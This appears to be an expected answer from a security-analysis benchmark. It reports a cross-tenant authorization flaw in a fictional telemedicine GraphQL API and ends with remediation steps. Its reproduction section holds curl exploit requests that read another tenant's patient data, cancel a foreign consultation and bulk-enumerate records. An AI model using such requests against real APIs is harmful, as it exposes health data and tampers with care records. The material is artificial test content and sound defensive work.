# Expected Response

## System
- Domain: Telemedicine / Remote Care
- System: TeleCare Consultation API
- Example ID: GQL-0036

## Priority Findings

### Finding 1: Cross-Tenant PHI Disclosure + Persistence Poisoning via listResources/Lifecycle Mutations — No Tenant Boundary (Pattern 4.2)
**Severity:** Critical
**Category:** Integrity / BAC

**Summary:**
The `listResources` query accepts a caller-supplied `tenantId` argument. An attacker from `tenant-c3c0` enumerated consultation records belonging to `tenant-8871`, exposing PHI (`sensitiveField: CONFIDENTIAL-c3c08871`, `internalNotes: Internal data exposed`). Beyond read access, the same missing tenant boundary in `updateResource` and `deleteResource` resolvers (§4.0 RISK-GQL-036) enables *persistence poisoning*: an attacker can update a patient's consultation status or permanently delete consultation records belonging to another care provider tenant. In telemedicine, this integrity attack can directly affect clinical outcomes.

**Evidence from HAR:**
- Request: `POST https://api.telecare-consultatio.example.com/graphql` (2026-04-13T16:22:34Z, 153 ms)
- JWT `x-tenant-id`: `tenant-c3c0` — attacker's authenticated identity
- Query payload: `listResources(tenantId: "tenant-8871") { resourceId ownerId data { sensitiveField } }` — attacker supplied foreign tenantId
- Response HTTP status: `200 OK` — no authorization error
- Response `tenantId`: `tenant-8871` — cross-tenant data returned
- Response `ownerId`: `other-user-c3c08871`
- Response `sensitiveField`: `CONFIDENTIAL-c3c08871` — PHI disclosed
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-c3c08871`

**Root Cause (§4.0 RISK-GQL-036):** "The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." The resolver uses caller-supplied `tenantId` as the filter. Because `updateResource` and `deleteResource` share the same lack of tenant guard, once an attacker can read cross-tenant `resourceId` values, they can invoke lifecycle mutations against those IDs — poisoning consultation records.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-036 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §3.0 | `listResources` | Accepts `tenantId: ID` from caller |
| context.txt §3.0 | `updateResource`, `deleteResource` | Lifecycle mutations accept cross-tenant IDs without tenant guard |
| HAR entry | request.postData | `listResources(tenantId: "tenant-8871")` from `tenant-c3c0` |
| HAR entry | response.content | `tenantId: "tenant-8871"`, `sensitiveField: "CONFIDENTIAL-c3c08871"`, `internalNotes: "Internal data exposed"` |

---

### Finding 2: Cross-Tenant Bulk Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass Enumeration

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own tenant)
```bash
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-c3c0" \
  -d '{"query": "query { listResources(tenantId: \"tenant-c3c0\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns only consultation records belonging to `tenant-c3c0`.

### Step 2 — Cross-tenant PHI enumeration (HAR attack)
```bash
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-c3c0" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-8871\") { resourceId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-8871"`, `ownerId: "other-user-c3c08871"`, `sensitiveField: "CONFIDENTIAL-c3c08871"`, `internalNotes: "Internal data exposed"` — cross-tenant PHI disclosed.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"listResources": null}}`.

### Step 3 — Persistence poisoning: lifecycle mutation on cross-tenant consultation record
```bash
# Attacker updates the status of a consultation belonging to tenant-8871
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-c3c0" \
  -d '{"query": "mutation { updateResource(id: \"other-user-c3c08871\", input: {status: \"cancelled\"}) { resourceId status } }"}'
```
**Vulnerable outcome:** Consultation record status updated to `cancelled` for `tenant-8871` — persistence poisoning achieved.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}]}`.

### Step 4 — Bulk cross-tenant enumeration
```bash
curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-c3c0" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-8871-001\", \"R-8871-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns consultation records from `tenant-8871` in bulk.
**Secure outcome:** Only own-tenant records returned; cross-tenant IDs yield null or FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "listResources": null }
}
```

## Remediation
1. **Strip tenantId from listResources input:** Derive tenant scope exclusively from the JWT. Remove or ignore the `tenantId` query argument.
2. **Resolver-level tenant guard on all lifecycle mutations:** `updateResource` and `deleteResource` MUST verify `WHERE resource_id = $id AND tenant_id = $jwt.tenantId` before any write (§4.0 RISK-GQL-036).
3. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, reject any result whose `tenant_id` ≠ JWT's `tenantId`.
4. **Audit log for cross-tenant modification attempts:** Any attempt to update/delete a resource whose `tenant_id` does not match the JWT must be logged and alerted (HIPAA audit trail requirement).
5. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only — change to `resourceId:tenantId`.
6. **Automated regression tests:** Assert `tenant-c3c0` calling `listResources(tenantId: "tenant-8871")` receives FORBIDDEN; assert `updateResource` on a foreign `resourceId` is rejected.
